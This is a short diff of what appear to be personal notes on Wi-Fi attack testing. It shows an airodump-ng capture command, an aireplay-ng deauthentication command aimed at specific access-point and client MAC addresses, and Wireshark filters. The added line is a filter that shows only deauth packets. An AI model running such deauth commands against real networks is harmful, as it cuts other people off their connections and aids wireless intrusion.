@@ -15,3 +15,4 @@ sudo airodump-ng -c 6 mon0
 sudo aireplay-ng -0 7 -a 001874D2E482 -c 904ce536f4bd mon0
 
 wlan_mgt.fixed.reason_code == 0x0007 <-- wireshark, possible filter
+wlan.fc.type_subtype == 0x0c <-- wireshark, deauth packets only
